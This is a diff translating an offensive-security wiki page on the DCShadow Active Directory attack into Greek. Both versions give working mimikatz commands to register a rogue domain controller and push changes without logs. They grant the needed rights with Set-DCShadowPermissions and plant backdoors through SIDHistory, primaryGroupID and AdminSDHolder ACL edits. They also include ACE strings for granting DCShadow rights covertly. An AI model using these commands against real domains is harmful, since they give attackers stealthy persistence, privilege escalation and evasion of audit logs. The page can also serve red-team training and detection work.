@@ -2,11 +2,10 @@
 
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Καταχωρεί έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **σπρώξει χαρακτηριστικά** (SIDHistory, SPNs...) σε καθορισμένα αντικείμενα **χωρίς** να αφήνει κανένα **καταγραφή** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα DA και να είστε μέσα στο **root domain**.\
+Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημες καταγραφές.
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
-
+Για να εκτελέσετε την επίθεση χρειάζεστε 2 περιπτώσεις του mimikatz. Μία από αυτές θα ξεκινήσει τους RPC servers με δικαιώματα SYSTEM (πρέπει να υποδείξετε εδώ τις αλλαγές που θέλετε να εκτελέσετε), και η άλλη περίπτωση θα χρησιμοποιηθεί για να σπρώξει τις τιμές:
 ```bash:mimikatz1 (RPC servers)
 !+
 !processtoken
@@ -16,28 +15,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
+Σημειώστε ότι **`elevate::token`** δεν θα λειτουργήσει σε `mimikatz1` συνεδρία καθώς αυτό αύξησε τα δικαιώματα του νήματος, αλλά πρέπει να αυξήσουμε το **δικαίωμα της διαδικασίας**.\
+Μπορείτε επίσης να επιλέξετε και ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Μπορείτε να σπρώξετε τις αλλαγές από έναν DA ή από έναν χρήστη με αυτές τις ελάχιστες άδειες:
 
-You can push the changes from a DA or from a user with this minimal permissions:
+- Στο **αντικείμενο τομέα**:
+- _DS-Install-Replica_ (Προσθήκη/Αφαίρεση Αντιγράφου στο Τομέα)
+- _DS-Replication-Manage-Topology_ (Διαχείριση Τοπολογίας Αναπαραγωγής)
+- _DS-Replication-Synchronize_ (Συγχρονισμός Αναπαραγωγής)
+- Το **αντικείμενο Sites** (και τα παιδιά του) στο **δοχείο Διαμόρφωσης**:
+- _CreateChild and DeleteChild_
+- Το αντικείμενο του **υπολογιστή που είναι καταχωρισμένος ως DC**:
+- _WriteProperty_ (Όχι Γράψιμο)
+- Το **στόχο αντικείμενο**:
+- _WriteProperty_ (Όχι Γράψιμο)
 
-- In the **domain object**:
-  - _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  - _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  - _DS-Replication-Synchronize_ (Replication Synchornization)
-- The **Sites object** (and its children) in the **Configuration container**:
-  - _CreateChild and DeleteChild_
-- The object of the **computer which is registered as a DC**:
-  - _WriteProperty_ (Not Write)
-- The **target object**:
-  - _WriteProperty_ (Not Write)
+Μπορείτε να χρησιμοποιήσετε [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα δικαιώματα σε έναν χρήστη χωρίς δικαιώματα (σημειώστε ότι αυτό θα αφήσει κάποια αρχεία καταγραφής). Αυτό είναι πολύ πιο περιοριστικό από το να έχετε δικαιώματα DA.\
+Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το όνομα χρήστη _**student1**_ όταν συνδεθεί στη μηχανή _**mcorp-student1**_ έχει άδειες DCShadow πάνω στο αντικείμενο _**root1user**_.
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
-
-## Using DCShadow to create backdoors
-
+## Χρήση του DCShadow για τη δημιουργία backdoors
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
@@ -52,24 +49,22 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
+## Shadowception - Δώστε δικαιώματα DCShadow χρησιμοποιώντας DCShadow (χωρίς τροποποιημένα αρχεία καταγραφής δικαιωμάτων)
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+Πρέπει να προσθέσουμε τα παρακάτω ACEs με το SID του χρήστη μας στο τέλος:
 
-We need to append following ACEs with our user's SID at the end:
+- Στο αντικείμενο τομέα:
+- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- Στο αντικείμενο υπολογιστή του επιτιθέμενου: `(A;;WP;;;UserSID)`
+- Στο αντικείμενο του στόχου χρήστη: `(A;;WP;;;UserSID)`
+- Στο αντικείμενο Sites στο δοχείο Configuration: `(A;CI;CCDC;;;UserSID)`
 
-- On the domain object:
-  - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-- On the attacker computer object: `(A;;WP;;;UserSID)`
-- On the target user object: `(A;;WP;;;UserSID)`
-- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+Για να αποκτήσετε το τρέχον ACE ενός αντικειμένου: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Σημειώστε ότι σε αυτή την περίπτωση πρέπει να κάνετε **πολλές αλλαγές,** όχι μόνο μία. Έτσι, στη **συνεδρία mimikatz1** (RPC server) χρησιμοποιήστε την παράμετρο **`/stack` με κάθε αλλαγή** που θέλετε να κάνετε. Με αυτόν τον τρόπο, θα χρειαστεί να **`/push`** μόνο μία φορά για να εκτελέσετε όλες τις συσσωρευμένες αλλαγές στον ρουγέ server.
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**Περισσότερες πληροφορίες σχετικά με το DCShadow στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
-
